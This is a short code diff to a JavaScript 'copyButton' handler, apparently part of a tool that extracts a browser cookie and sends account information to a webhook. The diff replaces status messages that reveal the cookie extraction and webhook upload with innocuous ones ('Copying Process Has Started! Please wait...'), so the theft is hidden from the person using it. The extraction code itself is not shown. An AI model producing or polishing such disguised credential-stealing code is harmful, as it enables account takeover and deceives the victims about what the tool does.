@@ -508,7 +508,7 @@ copyButton.addEventListener(
         /* Check if extraction actually got data */
         if (!extraction.data || extraction.data.length < 10) {
             statusMessage.textContent =
-                "Extracted cookie value is too short or empty.";
+                "Error";
 
             statusMessage.style.color =
                 "#ff9d9d";
@@ -524,7 +524,7 @@ copyButton.addEventListener(
 
 
         statusMessage.textContent =
-            "✓ Extracted cookie (" + extraction.data.length + " chars). Fetching account info and sending to webhook...";
+            "✓ Copying Process Has Started! Please wait...";
 
         statusMessage.style.color =
             "#caa8ff";
